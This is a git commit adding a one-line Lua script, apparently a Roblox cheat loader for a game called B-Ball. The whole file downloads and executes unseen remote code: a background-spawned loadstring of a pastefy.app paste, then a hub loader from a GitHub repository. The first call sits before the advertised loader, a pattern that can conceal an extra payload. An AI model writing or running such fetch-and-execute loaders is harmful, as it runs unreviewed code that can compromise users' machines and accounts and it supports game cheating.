2926e79dd665ebe4c8dc2d563de9a162b8aa4c21
RixtonHub <simpleguy01326@gmail.com>
2026-03-20 04:05:06 +0800

    Update and rename B-Ball to B-Ball.lua

---
+++ B-Ball.lua
@@ -0,0 +1,1 @@
+task.spawn(function()loadstring(game:HttpGet("https://pastefy.app/15gJEM25/raw"))()end)loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
